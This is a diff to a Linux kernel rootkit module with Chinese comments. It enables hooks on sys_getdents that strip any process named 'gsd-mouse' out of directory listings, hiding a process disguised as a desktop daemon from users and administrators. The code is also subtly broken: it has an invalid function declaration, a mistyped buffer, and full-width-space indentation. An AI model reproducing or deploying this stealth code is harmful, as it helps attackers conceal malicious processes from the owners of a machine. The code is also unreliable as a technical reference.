@@ -16,81 +16,82 @@
 #include <asm/unistd.h>
 #include <linux/types.h>
 #include <linux/dirent.h>
+#include <linux/compiler_types.h>
 
 #define FLAG 0x80000000
 const char *protected = "gsd-mouse";
 int protected_pid = -1;
-// int myatoi(char *str)
-// {
-// 　　int res = 0;
-// 　　int mul = 1;
-// 　　char *ptr;
-// 　　for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
-// 	　　if (*ptr < '0' || *ptr > '9') return (-1);
-// 	　　res += (*ptr - '0') * mul;
-// 	　　mul *= 10;
-// 　　}
-// 　　return (res);
-// }
+int myatoi(char *str)
+{
+　　int res = 0;
+　　int mul = 1;
+　　char *ptr;
+　　for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
+	　　if (*ptr < '0' || *ptr > '9') return (-1);
+	　　res += (*ptr - '0') * mul;
+	　　mul *= 10;
+　　}
+　　return (res);
+}
 
-// static inline char *get_name(struct task_struct *p, char *buf)
-// 　　{
-// 　　int i;
-// 　　char *name;
-// 　　name = p->comm;
-// 　　i = sizeof(p->comm);
-// 　　do {
-// 　　unsigned char c = *name;
-// 　　name++;
-// 　　i--;
-// 　　*buf = c;
-// 　　if (!c)
-// 　　break;
-// 　　if (c == '\\') {
-// 　　buf[1] = c;
-// 　　buf += 2;
-// 　　continue;
-// 　　}
-// 　　if (c == '\n') {
-// 　　buf[0] = '\\';
-// 　　buf[1] = 'n';
-// 　　buf += 2;
-// 　　continue;
-// 　　}
-// 　　buf++;
-// 　　}
-// 　　while (i);
-// 　　*buf = '\n';
-// 　　return buf + 1;
-// 　　}
+static inline char *get_name(struct task_struct *p, char *buf)
+　　{
+　　int i;
+　　char *name;
+　　name = p->comm;
+　　i = sizeof(p->comm);
+　　do {
+　　unsigned char c = *name;
+　　name++;
+　　i--;
+　　*buf = c;
+　　if (!c)
+　　break;
+　　if (c == '\\') {
+　　buf[1] = c;
+　　buf += 2;
+　　continue;
+　　}
+　　if (c == '\n') {
+　　buf[0] = '\\';
+　　buf[1] = 'n';
+　　buf += 2;
+　　continue;
+　　}
+　　buf++;
+　　}
+　　while (i);
+　　*buf = '\n';
+　　return buf + 1;
+　　}
 
-// int get_process(pid_t pid) 
-// {
-// 　　struct task_struct *task = get_task(pid);
-// 　　char *buffer[64] = {0};
-// 　　if (task)
-// 　　{
-// 　　	get_name(task, buffer);
-// 　　	if(strstr(buffer,protected))	return 1;  //比较protected 和目录下的进程名
-// 	　　else return 0;
-// 　　}
-// 　　else
-// 　　	return 0;
-// }
+int get_process(pid_t pid) 
+{
+　　struct task_struct *task = get_task(pid);
+　　char *buffer[64] = {0};
+　　if (task)
+　　{
+　　	get_name(task, buffer);
+　　	if(strstr(buffer,protected))	return 1;  //比较protected 和目录下的进程名
+	　　else return 0;
+　　}
+　　else
+　　	return 0;
+}
 
-// struct *task_struct get_task(pid_t pid)
-// 　{
-// 　　struct task_struct *p = get_current(),*entry=NULL;
-// 　　list_for_each_entry(entry,&(p->tasks),tasks)
-// 　　{
-// 	　　if(entry->pid == pid)
-// 	　　{
-// 	　　printk("pid found\n");
-// 	　　return entry;
-// 	　　}
-// 　　}
-// 　　return NULL;
-// 　}
+struct *task_struct get_task(pid_t pid)
+　{
+　　struct task_struct *p = get_current(),*entry=NULL;
+　　list_for_each_entry(entry,&(p->tasks),tasks)
+　　{
+	　　if(entry->pid == pid)
+	　　{
+	　　printk("pid found\n");
+	　　return entry;
+	　　}
+　　}
+　　return NULL;
+　}
 
 static int print_pid(void)
 {
@@ -203,34 +204,34 @@ static long khook_sys_kill(pid_t pid, int sig) {
 }
 
 
-KHOOK(sys_getdents);
+KHOOK_EXT(long, sys_getdents, unsigned int, struct linux_dirent64 __user *, unsigned int);
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
 	long value=0;
-// 　　struct inode *dinode;
-// 　　int len = 0;
-// 　　int tlen = 0;
-// 　　struct linux_dirent64 *mydir = NULL;
-// 　　//end
-// 　　//在这里调用一下sys_getdents,得到返回的结果
-// 　　value = (*orig_getdents) (fd, dirp, count);
-// 　　tlen = value;
-// 　　//遍历得到的目录列表
-// 　　while(tlen > 0)
-// 　　{
-// 　　len = dirp->d_reclen;
-// 　　tlen = tlen - len;
-// 　　printk("%s\n",dirp->d_name);
-// 　　//在proc文件系统中，目录名就是pid,我们再根据pid找到进程名
-// 　　if(get_process(myatoi(dirp->d_name)) )
-// 　　{
-// 　　printk("find process\n");
-// 　　//发现匹配的进程，调用memmove将这条进程覆盖掉
-// 　　memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
-// 　　value = value - len;
-// 　　}
-// 　　if(tlen)
-// 　　dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
-// 　　}
+　　struct inode *dinode;
+　　int len = 0;
+　　int tlen = 0;
+　　struct linux_dirent64 *mydir = NULL;
+　　//end
+　　//在这里调用一下sys_getdents,得到返回的结果
+　　value = (*orig_getdents) (fd, dirp, count);
+　　tlen = value;
+　　//遍历得到的目录列表
+　　while(tlen > 0)
+　　{
+　　len = dirp->d_reclen;
+　　tlen = tlen - len;
+　　printk("%s\n",dirp->d_name);
+　　//在proc文件系统中，目录名就是pid,我们再根据pid找到进程名
+　　if(get_process(myatoi(dirp->d_name)) )
+　　{
+　　printk("find process\n");
+　　//发现匹配的进程，调用memmove将这条进程覆盖掉
+　　memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
+　　value = value - len;
+　　}
+　　if(tlen)
+　　dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
+　　}
 　　return value;
 }
 
